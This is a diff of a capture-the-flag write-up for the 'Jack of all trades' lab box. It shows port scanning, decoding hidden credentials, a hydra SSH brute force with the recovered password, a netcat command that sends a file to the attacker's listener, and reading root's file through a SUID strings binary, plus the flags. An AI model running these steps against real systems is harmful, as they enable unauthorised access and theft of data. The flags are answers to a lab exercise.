@@ -8,7 +8,6 @@ Boot-to-root originally designed for Securi-Tay 2020
 
 Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?
 
-
 ```
                                                                                                          
 ┌──(kali㉿kali)-[~]
@@ -54,9 +53,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 89.88 seconds
 zsh: segmentation fault  sudo nmap -sC -sV -T4 -A 10.10.144.155
 
-
 Interestingly, standard ports for SSH and HTTP have been changed/mixed. HTTP is available on port 22 while SSH is served by port 80. Chances are that you will get an error message if you try to browse the website in Firefox (due to a security feature). To bypass the security protection, enter “about:config” in the URL and type “network.security.ports.banned.override” in the search. Create/edit the value by adding 22 to the string. 
-
 
 http://10.10.144.155:22/
 
@@ -88,7 +85,6 @@ now I can see
                 </main>
         </body>
 </html>
-
 
 ┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
 └─$ echo 'UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==' | base64 -d
@@ -159,9 +155,7 @@ login to http://10.10.144.155:22/recovery.php
         </body>
 </html>
 
-
 To decode the secret: base32 > hex > ROT13. 
-
 
 Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
 
@@ -217,7 +211,6 @@ n.FZvJ.x9sYe5s5d
 z@e1PmlmQ%k5sDz@
 ow5APF>6r,y4krSo
 
-
 using hydra
 
 ┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
@@ -231,7 +224,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-25 01:12:
 [80][ssh] host: 10.10.144.155   login: jack   password: ITMJpGGIqg1jn?>@
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-25 01:12:06
-
 
 found ssh
 
@@ -275,13 +267,11 @@ b3dr0ck    ferox-http_10_10_6_231-1664076028.state  key                  rev.pha
 badbyte    glitch                                   key.hash             shell.pdf.php  wget_ctf
 cms.creds  header.jpg                               notice.txt           shell.php5
 
-
 jack@jack-of-all-trades:~$ nc 10.18.1.77 1337 < user.jpg
 
 in the image is the flag
 
 securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}
-
 
 jack@jack-of-all-trades:~$ sudo -l
 [sudo] password for jack: 
@@ -303,7 +293,6 @@ jack@jack-of-all-trades:~$ find / -type f -user root -perm -u=s 2>/dev/null
 /bin/umount
 /bin/su
 
-
 let's see with strings like root
 
 jack@jack-of-all-trades:~$ strings /root/root.txt
@@ -315,25 +304,13 @@ ToDo:
 5.Remember to finish that contract for Lisa.
 6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
 
-
-
 ```
-
-
-![[Pasted image 20220924235502.png]]
-![[Pasted image 20220925000317.png]]
-
-![[Pasted image 20220925001652.png]]
 
 User Flag
 *securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}*
 
-
-
 Root Flag
 /root/root.txt
 *securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}*
-
-
 
 [[Ignite]]
